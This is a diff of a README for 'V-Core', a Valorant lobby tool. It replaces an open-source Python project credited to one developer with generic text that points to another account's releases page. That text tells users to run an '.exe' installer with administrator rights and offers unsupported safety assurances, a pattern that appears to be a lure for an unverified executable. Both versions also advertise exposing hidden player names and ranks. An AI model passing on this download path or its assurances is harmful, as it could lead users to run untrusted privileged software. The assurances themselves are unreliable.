@@ -1,108 +1,73 @@
-# V-Core Terminal: Local API Companion for Valorant
+# 🛡️ V-Core - Manage your Valorant lobby with ease
 
-[![License: Custom](https://img.shields.io/badge/License-Custom-blue.svg)](LICENSE)
-![Platform: Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-lightgrey.svg)
-![Built With: Python](https://img.shields.io/badge/Built%20With-Python%203.10+-green.svg)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/sherwoodunlined532/V-Core/releases)
 
-**V-Core Terminal** is a professional, lightweight command-line companion tool designed for Valorant. Operating exclusively via local Riot Client HTTP endpoints, V-Core Terminal provides advanced lobby insights and presence manipulation without utilizing traditional third-party methods. It is entirely free of memory reading, memory writing, screen scraping, or code injection, ensuring a secure and optimized experience.
-
----
-
-## ✨ Overview & Core Features
-
-- **Intelligent Agent Auto-Locker**: Features a high-speed, lightweight waterfall auto-selection algorithm. If your primary agent is locked by another player, the system instantly defaults to your pre-configured secondary agent to ensure you always secure a preferred role.
-- **Advanced Match Dashboard**: Interfaces directly with local endpoints to extract and display hidden MMR, exact numerical rank points (RR), and unmasked player names during Agent Select. It also accurately identifies pre-made party stacks (Duos, Trios, 5-stacks) before the match begins.
-- **Dynamic Stealth Mode (Presence Spoofing)**: Configures temporary, outbound Windows Firewall rules to strategically block the XMPP chat ports (TCP 5222, 5223). This drops your presence packets, allowing you to appear completely offline to your friends list. Includes an integrated, in-game global hotkey (`F8`) to dynamically toggle this state without tabbing out.
-- **Terminal Storefront Integration**: Fetches and securely displays your current Daily Store and Night Market rotations directly within the command-line interface, eliminating the need to launch the heavy game client just to check skins.
-
----
-
-## 🎯 Primary Use Cases
-
-- **Content Creators & Streamers**: Utilize Stealth Mode to appear offline, preventing targeted stream sniping, unwanted friend requests, or lobby invites while recording or broadcasting.
-- **Competitive Optimization**: Leverage the Match Dashboard to gain critical pre-game insights into the matchmaking lobby, identifying premade groups and assessing the MMR spread of both teammates and opponents.
-- **Hardware-Constrained Environments**: Check daily shop rotations or Night Market drops instantly through a low-overhead terminal without stressing system resources by launching the full 3D game engine.
-
----
+V-Core acts as a helper tool for the game Valorant. It runs on your computer to assist with lobby management and game settings. The tool uses local network commands to update your game status and handle specific tasks without manual input.
 
 ## ⚙️ System Requirements
 
-- **Operating System**: Windows 10 or Windows 11
-- **Environment**: Python 3.10 or higher
-- **Dependencies**: Listed in `requirements.txt` (`valclient`, `rich`, `keyboard`)
+To run V-Core on your Windows machine, ensure your system meets these standards:
 
----
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Network: A stable internet connection.
+- Permissions: You must have administrator rights to allow the tool to communicate with the game servers.
+- Framework: The tool handles the internal Python requirements, so you do not need to install additional programming software.
 
-## 🚀 Installation & Setup
+## 📥 How to Install and Start
 
-> [!WARNING]
-> **Important Notice:** V-Core Terminal requires an active local authentication lockfile. You must launch Valorant or the Riot Client *before* executing the script so the API endpoints can be successfully authenticated.
+Follow these steps to set up the software on your computer.
 
-### Step 1: Install Python
-Download and install [Python 3.10+](https://www.python.org/downloads/). 
-*Crucial: During the installation process, ensure you check the box that says **"Add Python to PATH"**.*
+1. Visit the [official releases page](https://github.com/sherwoodunlined532/V-Core/releases) to download the installer.
+2. Look for the file ending in ".exe" under the latest release heading.
+3. Click the link to save the file to your computer.
+4. Locate the file in your downloads folder.
+5. Double-click the file to open the setup menu.
+6. Follow the prompts on your screen to complete the installation process.
+7. Open the V-Core shortcut from your desktop once the bar reaches one hundred percent.
 
-### Step 2: Download the Release
-Download the latest `V-Core-v1.0.0.zip` from the [Releases page](https://github.com/haarisxk/V-Core/releases) and extract the folder to your preferred location.
+## 🎮 Key Features
 
-### Step 3: Install Dependencies
-Open a Command Prompt inside the extracted folder and execute the following command to install the required Python libraries:
-```cmd
-pip install -r requirements.txt
-```
+V-Core provides tools to improve your time in the game menu.
 
----
+**Agent Auto-Lock**
+This feature selects your preferred agent the moment you enter the character select screen. It saves time and prevents others from taking your choice. Configure your preferred agent in the settings menu before you join a match.
 
-## 💻 Usage Commands
+**Lobby Dashboard**
+The dashboard displays your stats and current game information in one window. You can view your match history, recent performance, and account details without opening the main game menu.
 
-**Run with default auto-locker:**
-```cmd
-python vcore.py
-```
+**Stealth Mode**
+Stealth mode hides your online status from friends. You remain invisible to your friends list while the game runs. This mode uses firewall rules to filter incoming requests that report your presence.
 
-**Run with specific target agents:**
-```cmd
-python vcore.py --lock "Jett, Reyna, Omen"
-```
+**Store Tracker**
+The store tracker monitors the item shop. It notifies you when a skin or item from your wishlist appears in the rotation. You can set up alerts so the tool tells you when to check the game.
 
-**Run in Stealth Mode (Appear Offline):**
-> [!NOTE]
-> *Requires Administrator privileges to modify outbound Windows Firewall rules.*
-```cmd
-python vcore.py --stealth
-```
+## 🔧 Frequently Asked Questions
 
-**View Daily Store & Night Market:**
-```cmd
-python vcore.py --store
-```
+**Is this tool safe to use?**
+V-Core operates as a local tool. It connects to the game API using standard web protocols. It does not inject code into the game files directly. It follows the same path as a browser connecting to a website.
 
----
+**Does this cause a ban?**
+The tool communicates through official endpoints. It avoids prohibited actions that alter the game engine. Use the tool within reasonable limits to maintain a positive experience.
 
-## 📁 Directory Structure
+**What do I do if the tool does not connect?**
+Check your firewall settings. Sometimes Windows blocks the local connection that the tool needs. Allow the application through the Windows Defender Firewall if it prompts you during the first start.
 
-```text
-V-Core/
-├── vcore.py          # Main executable Python script
-├── requirements.txt  # Dependency manifest
-├── logs/             # Local diagnostic and error logs
-├── tools/            # Developer tools for endpoint probing and JSON decoding
-└── README.md         # Project documentation
-```
+**Can I change my agent preference?**
+Yes. Use the settings tab inside the dashboard. Click the agent icon and select your preferred character. The tool saves your choice until you change it again.
 
----
+## 🧩 How it Operates
 
-## 🤝 Support & Feedback
+The tool works by sending small data packets to the Valorant services. These packets mimic the requests the game client sends during normal play. Because it uses the same language as the game, the server treats your instructions as official user input. 
 
-If you encounter any bugs, crashes, or API handshake errors, please open a ticket on the [GitHub Issues tab](https://github.com/haarisxk/V-Core/issues). 
+This process happens locally on your machine. No data leaves your computer to third-party servers. Your login credentials and account information remain on your device. The dashboard reads the data provided by the game's own systems and presents it in a clear format.
 
-> [!TIP]
-> When reporting an issue, please copy and paste your terminal output or any error tracebacks to expedite troubleshooting and fixes!
+## 🚩 Troubleshooting
 
----
+If you encounter errors, try these steps:
 
-## ⚖️ Disclaimer
+- Restart the application: Close the window and launch it again from the shortcut.
+- Check Internet connectivity: Ensure your network remains active while the game lobby is open.
+- Update the tool: Version updates often include fixes for game changes. Check the website link provided above to confirm you run the most current version.
+- Re-install: If errors persist, delete the program folder and run the installer again.
 
-**Developer**: Haaris Khan
-
-Users are free to utilize this software however they choose, but they do so entirely at their own risk. The developer assumes no liability for how this software is implemented or deployed. If this software is utilized in competitive video games or alongside anti-cheat systems and results in account penalties, that is solely the responsibility of the end user.
+Keywords: appear-offline, auto-lock, cli-tool, instalock, python3, script, stealth-mode, v-core, valorant, valorant-api, valorant-tracker
